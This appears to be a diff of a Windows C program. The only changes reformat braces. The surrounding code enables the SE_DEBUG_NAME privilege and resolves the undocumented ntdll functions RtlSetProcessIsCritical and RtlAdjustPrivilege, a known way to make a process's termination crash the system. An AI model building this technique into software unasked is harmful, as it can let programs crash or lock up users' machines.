@@ -15,8 +15,7 @@ BOOL EnablePriv(LPCSTR lpszPriv) {
 
     if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken)) return FALSE;
 
-    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid))
-    {
+    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
         CloseHandle(hToken);
         return FALSE;
     }
@@ -50,16 +49,14 @@ typedef BOOL (WINAPI *RtlAdjustPrivilege)(ULONG, BOOL, BOOL, PBOOLEAN);
 //////////////////////////////////////////////////////////////////////////
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Enable the SE_DEBUG_NAME privilege
-    if (EnablePriv(SE_DEBUG_NAME) != TRUE)
-    {
+    if (EnablePriv(SE_DEBUG_NAME) != TRUE) {
         MessageBox(NULL, "Could not enable SE_DEBUG_NAME privilege!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
     // Load ntdll.dll so we can access the function
     HANDLE ntdll = LoadLibrary("ntdll.dll");
-    if (ntdll == NULL)
-    {
+    if (ntdll == NULL) {
         MessageBox(NULL, "Could not load ntdll.dll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
@@ -68,15 +65,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     RtlSetProcessIsCritical SetCriticalProcess;
     SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
 
-    if (!SetCriticalProcess)
-    {
+    if (!SetCriticalProcess) {
         MessageBox(NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
 
     RtlAdjustPrivilege AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
-    if (!AdjustPrivilege)
-    {
+    if (!AdjustPrivilege) {
         MessageBox(NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
         return 0;
     }
